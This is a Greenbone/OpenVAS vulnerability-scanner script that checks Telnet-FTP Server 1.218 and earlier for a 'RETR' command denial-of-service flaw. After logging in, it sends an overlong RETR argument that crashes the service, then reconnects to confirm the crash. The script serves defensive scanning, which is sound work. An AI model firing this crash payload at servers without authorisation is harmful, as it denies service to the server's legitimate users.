if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902819" );
	script_version( "2021-08-06T11:34:45+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-03-21 16:16:16 +0530 (Wed, 21 Mar 2012)" );
	script_name( "Telnet-FTP Server 'RETR' Command Remote Denial of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/telnet_ftp/detected" );
	script_xref( name: "URL", value: "http://www.1337day.com/exploits/17779" );
	script_xref( name: "URL", value: "http://www.allinfosec.com/2012/03/20/dos-poc-telnet-ftp-server-v1-218-remote-crash-poc" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to crash the
  affected application, denying service to legitimate users." );
	script_tag( name: "affected", value: "Telnet-Ftp Server version 1.218 and prior." );
	script_tag( name: "insight", value: "The flaw is caused due an error when handling 'RETR' command,
  which can be exploited to crash the FTP service by sending specially crafted FTP commands." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Telnet-FTP Server and is prone to denial of
  service vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "Telnet-Ftp Server" )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
login_details = ftp_log_in( socket: soc, user: user, pass: pass );
if(!login_details){
	exit( 0 );
}
exploit = "RETR " + crap( 256 );
ftp_send_cmd( socket: soc, cmd: exploit );
ftp_send_cmd( socket: soc, cmd: exploit );
ftp_close( socket: soc );
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	security_message( ftpPort );
	exit( 0 );
}
banner = recv( socket: soc1, length: 512 );
if(!banner || !ContainsString( banner, "Telnet-Ftp Server" )){
	security_message( ftpPort );
	exit( 0 );
}
ftp_close( socket: soc1 );

